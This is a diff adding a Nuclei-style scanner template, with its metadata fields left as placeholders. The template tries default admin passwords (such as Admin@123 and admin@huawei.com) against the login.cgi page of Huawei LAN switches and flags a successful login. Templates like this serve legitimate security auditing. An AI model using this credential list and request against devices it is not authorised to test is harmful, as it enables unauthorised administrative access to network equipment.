@@ -1,0 +1,49 @@
+id: Huawei-Lanswitch-default-login
+info:
+  name: Template Name
+  author: wangzong
+  severity: info
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /login.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: loginFlag=true
+        Content-Length: 39
+        Sec-Ch-Ua: "Chromium";v="121", "Not A(Brand";v="99"
+        Sec-Ch-Ua-Platform: "macOS"
+        Sec-Ch-Ua-Mobile: ?0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; text/xml; charset=UTF-8
+        Accept: */*
+        Origin: https://{{Hostname}}
+        Sec-Fetch-Site: same-origin
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Dest: empty
+        Referer: https://{{Hostname}}/simple/view/login.html
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Priority: u=1, i
+        Connection: close
+
+        UserName=admin&Password={{password}}&Edition=0
+    payloads:        
+      password:
+        - Helloworld@6789
+        - admin@huawei.com
+        - Admin@123
+        - Admin@huawei.com        
+        
+    stop-at-first-match: true
+
+    
+    matchers:
+      - type: word
+        part: body
+        negative: true
+        words:
+          - '1008'
